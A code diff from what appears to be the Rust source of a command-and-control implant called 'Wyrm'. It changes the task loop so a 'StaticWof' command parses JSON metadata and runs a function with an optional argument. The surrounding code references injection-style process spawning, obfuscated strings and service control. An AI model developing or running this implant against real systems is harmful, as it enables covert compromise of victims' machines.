@@ -52,8 +52,9 @@ use crate::{
         comptime::translate_build_artifacts, console::print_info, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
+    wofs::call_static_wof_with_arg,
 };
-use crate::{utils::console::print_failed, wofs::call_static_wof};
+use crate::{utils::console::print_failed, wofs::call_static_wof_no_arg};
 
 pub struct RetriesBeforeExit {
     /// The time in seconds to sleep between failed connections on first connection
@@ -347,7 +348,7 @@ impl Wyrm {
                     Spawn::spawn_child(buf, SpawnMethod::EarlyCascade, &self.spawn_as);
                 }
                 Command::StaticWof => {
-                    let Some(fn_name) = &task.metadata else {
+                    let Some(metadata) = &task.metadata else {
                         let msg = sc!("No metadata found.", 97).unwrap();
                         print_failed(msg);
                         self.push_completed_task::<String>(&task, None);
@@ -355,7 +356,21 @@ impl Wyrm {
                         continue;
                     };
 
-                    let result = call_static_wof(fn_name);
+                    let Ok(metadata_deser) = serde_json::from_str::<Vec<String>>(metadata) else {
+                        let msg =
+                            sc!("Could not deserialise metadata for running the WOF.", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    let result = if metadata_deser.len() == 1 {
+                        call_static_wof_no_arg(&metadata_deser[0])
+                    } else {
+                        call_static_wof_with_arg(&metadata_deser[0], &metadata_deser[1])
+                    };
+
                     self.push_completed_task(&task, Some(result));
                 }
             }
